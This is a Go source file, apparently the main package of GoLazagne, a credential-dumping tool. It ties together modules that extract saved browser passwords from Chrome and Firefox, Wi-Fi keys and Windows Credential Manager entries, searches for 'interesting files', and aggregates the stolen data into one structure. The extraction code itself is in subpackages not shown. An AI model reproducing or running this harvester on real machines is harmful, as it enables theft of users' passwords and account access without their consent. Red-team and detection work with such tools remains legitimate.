package GoLazagne

import (
	"bitbucket.org/j_kerby/golazagne/browsers"
	"bitbucket.org/j_kerby/golazagne/common"
	"bitbucket.org/j_kerby/golazagne/filesystem"
	"bitbucket.org/j_kerby/golazagne/wifi"
	"bitbucket.org/j_kerby/golazagne/windows"
)

func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
	var AllBrowsersData []common.UrlNamePass
	if resultChrome := browsers.ChromeExtractDataRun(); resultChrome.Success {
		AllBrowsersData = append(AllBrowsersData, resultChrome.Data...)
	}

	if resultMozilla := browsers.MozillaExtractDataRun(); resultMozilla.Success {
		AllBrowsersData = append(AllBrowsersData, resultMozilla.Data...)
	}

	return AllBrowsersData, len(AllBrowsersData)
}

func ExtractWifiData() ([]common.NamePass, int) {
	var resultWifi = wifi.WifiExtractDataRun()
	if resultWifi.Success {
		return resultWifi.Data, len(resultWifi.Data)
	}
	return nil, 0
}

func ExtractCredmanData() ([]common.NamePass, int) {
	var windowsResult = windows.CredManModuleStart()
	if windowsResult.Success {
		return windowsResult.Data, len(windowsResult.Data)
	}
	return nil, 0
}

func ExtractInterstingFiles() []string{
	var data = filesystem.FindFiles()
	return data
}

type AllDataStruct struct {
	WifiData    []common.NamePass    `json:"wifi"`
	BrowserData []common.UrlNamePass `json:"browser"`
	CredmanData []common.NamePass    `json:"credman"`
}

type CommonStructFlags struct {
	Debug bool
}

func ExtractAllData() (AllDataStruct, int) {
	var wifiData, lengthWiFiData = ExtractWifiData()
	var browserData, lengthBrowserData = ExtractBrowserCredentials()
	var credmanData, lengthCredmanData = ExtractCredmanData()

	var outDataStruct AllDataStruct

	if lengthWiFiData > 0 {
		outDataStruct.WifiData = wifiData
	}
	if lengthBrowserData > 0 {
		outDataStruct.BrowserData = browserData
	}
	if lengthCredmanData > 0 {
		outDataStruct.CredmanData = credmanData
	}

	return outDataStruct, lengthCredmanData + lengthBrowserData + lengthWiFiData
}
